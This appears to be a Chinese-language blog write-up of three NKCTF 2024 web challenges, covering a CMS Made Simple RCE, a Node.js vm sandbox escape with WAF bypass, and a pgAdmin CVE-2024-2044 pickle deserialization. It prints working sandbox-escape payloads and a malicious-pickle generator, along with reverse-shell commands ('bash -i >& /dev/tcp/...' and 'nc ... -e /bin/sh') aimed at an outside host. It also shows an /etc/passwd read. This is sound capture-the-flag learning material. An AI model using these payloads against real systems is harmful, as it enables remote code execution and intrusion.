@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CVE-2019-9059、沙箱逃逸、CVE-2024-2044">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NKCTF 2024">
+<meta property="og:url" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="CVE-2019-9059、沙箱逃逸、CVE-2024-2044">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093321830.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093554457.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092708716.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092809851.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325213907880.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png">
+<meta property="article:published_time" content="2024-03-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-23T13:47:13.310Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="CMS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NKCTF 2024 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NKCTF 2024
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-26 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-26T00:00:00+08:00">2024-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-06-23 21:47:13" itemprop="dateModified" datetime="2024-06-23T21:47:13+08:00">2024-06-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html" class="post-meta-item leancloud_visitors" data-flag-title="NKCTF 2024" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
+<span id="more"></span>
+
+<h1 id="NKCTF-2024"><a href="#NKCTF-2024" class="headerlink" title="NKCTF 2024"></a>NKCTF 2024</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png"></p>
+<p>扫一下发现存在后台登陆界面，直接访问</p>
+<p>用字典爆破下admin的密码为Admin123</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093321830.png"></p>
+<p>然后直接登录，去漏洞库搜一下其实存在很多漏洞（重点看最近的）</p>
+<p>找到CMS Made Simple的RCE漏洞（CVE-2019-9059）<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49345">参考文章</a></p>
+<p>步骤如下</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093554457.png"></p>
+<p>登陆后按照上图，保存后去执行代码</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092708716.png"></p>
+<p>成功反弹shell，得到flag</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092809851.png"></p>
+<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>扫目录发现存在<code>/secret</code>源码泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.use(bodyParser.json())</span><br><span class="line">.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">.use(express.static(path.join(__dirname, &#x27;/public&#x27;)))</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">    res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function waf(code) &#123;</span><br><span class="line">    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;</span><br><span class="line">    if(code.match(pattern))&#123;</span><br><span class="line">        throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">        let code = req.body.code;</span><br><span class="line">        let sandbox = Object.create(null);</span><br><span class="line">        let context = vm.createContext(sandbox);</span><br><span class="line">        try &#123;</span><br><span class="line">            waf(code)</span><br><span class="line">            let result = vm.runInContext(code, context);</span><br><span class="line">            console.log(result);</span><br><span class="line">        &#125; catch (e)&#123;</span><br><span class="line">            console.log(e.message);</span><br><span class="line">            require(&#x27;./hack&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(3000, ()=&gt;&#123;</span><br><span class="line">    console.log(&quot;listen on 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>本题是考察如何沙箱逃逸实现RCE，waf过滤很多，process被办意味着我们需要用别的手段去得到process对象，中括号被办就不能利用js特性拼接绕过，<code>\</code>被办意味着不能十六进制或者Unicode绕过。</p>
+<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p><a target="_blank" rel="noopener" href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">参考LaoGong战队</a></p>
+<p>我们注意到源码中的沙箱定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let code = req.body.code;</span><br><span class="line">let sandbox = Object.create(null);</span><br><span class="line">let context = vm.createContext(sandbox);</span><br></pre></td></tr></table></figure>
+
+<p>create内为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。</p>
+<p>而一般情况如果没有执行字符串操作或者利用函数重写，我们可以利用Proxy劫持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>而本题过滤了很多，我们可以用replace函数来绕过对process的检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const p = (cc.constructor.constructor(&#x27;return proAcess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">const obj=p.mainModule.require(&#x27;child_process&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>接下来是最为精彩的一步，利用javascript内置函数去返回一个属性描述符（PropertyDescriptor）对象，其中包括value也就是属性值</p>
+<p>最终payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">			const obj = p.mainModule.require(&#x27;child_procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			const ex = Object.getOwnPropertyDescriptor(obj,&#x27;exeAcSync&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			return ex.value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&quot;&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell，执行<code>/readflag</code>得到flag</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325213907880.png"></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2024/03/23/NKCTF2024/">参考文章</a></p>
+<p>我们注意下面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>process.__filename</code>为null则回显源码，我们可以利用原型链污染<code>__filename</code>实现任意文件读取</p>
+<p>本解法利用反射去得到process对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))()</span><br><span class="line">        return p.__filename=&quot;/etc/passwd&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 &#x2F;secret 即可成功读取</p>
+<p>尝试读&#x2F;flag，返回permission denied, open ‘&#x2F;flag’，没权限直接读</p>
+<p>尝试读<code>./hack</code>，注意路径是<code>/app/hack.js</code>，提示<code>shell.js</code>跟进一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;shell&quot;); const p = require(&#x27;child_process&#x27;); p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller;</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))();</span><br><span class="line">        p.env.command=&quot;whoami&quot;;</span><br><span class="line">        return p.mainModule.require(&quot;./shell&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><blockquote>
+<p>pgAdmin CVE-2024-2044</p>
+</blockquote>
+<p>猜测出用户和密码<code>tacooooo@qq.com tacooooo</code></p>
+<p>登陆后发现是pgAdmin 4，搜索一番发现有个很新的漏洞 <a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">参考文章</a></p>
+<p>poc.py如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\x80\x04\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # if len(sys.argv) != 2:</span><br><span class="line">    #     exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    # with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #     f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;nc 115.236.153.172 41678 -e /bin/sh&quot;))</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;nc 5i781963p2.yicp.fun 58265 -e /bin/sh&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>直接<code>python3 poc.py</code>生成pickle文件（这里kali不行，用了其他师傅的Ubuntu生成的）</p>
+<p>上传成功后，修改cookie为<code>pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a</code></p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png"></p>
+<p>然后成功反弹shell，在<code>proc/1/environ</code>找到flag</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CMS/" rel="tag"># CMS</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/NSSRound-18-Basic.html" rel="prev" title="NSSRound#18 Basic">
+      <i class="fa fa-chevron-left"></i> NSSRound#18 Basic
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html" rel="next" title="fastjson入门学习">
+      fastjson入门学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NKCTF-2024"><span class="nav-number">1.</span> <span class="nav-text">NKCTF 2024</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#my-first-cms"><span class="nav-number">1.1.</span> <span class="nav-text">my first cms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84CTF"><span class="nav-number">1.2.</span> <span class="nav-text">全世界最简单的CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="nav-number">1.2.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="nav-number">1.2.2.</span> <span class="nav-text">解法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#attack-tacooooo"><span class="nav-number">1.3.</span> <span class="nav-text">attack_tacooooo</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
